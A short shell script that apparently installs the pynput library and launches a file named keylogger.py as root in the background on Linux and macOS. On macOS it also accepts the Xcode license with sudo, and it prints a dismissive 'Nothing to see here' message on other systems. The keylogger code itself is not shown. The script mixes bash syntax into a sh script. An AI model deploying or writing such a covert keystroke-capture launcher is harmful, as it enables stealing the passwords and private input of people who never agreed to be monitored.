#!/bin/sh

if [[ "$OSTYPE" == "linux-gnu" ]]; then
  echo "Linux Specific instructions"
  sudo apt install python3-pip -y
  pip3 install --upgrade pip
  pip3 install pynput --user
  sudo python3 keylogger.py &
elif [[ "$OSTYPE" == "darwin"* ]]; then
  echo "Mac Specific instructions"
  sudo xcodebuild -license accept
  sudo python -m ensurepip
  pip install pynput --user
  sudo python keylogger.py &
elif [[ "$OSTYPE" == "cygwin" ]]; then
  echo "Cygwin specific instructions"
elif [[ "$OSTYPE" == "msys" ]]; then
  echo "MinGW specific instructions"
else
  echo "Nothing to see here. Move along . . ."
fi
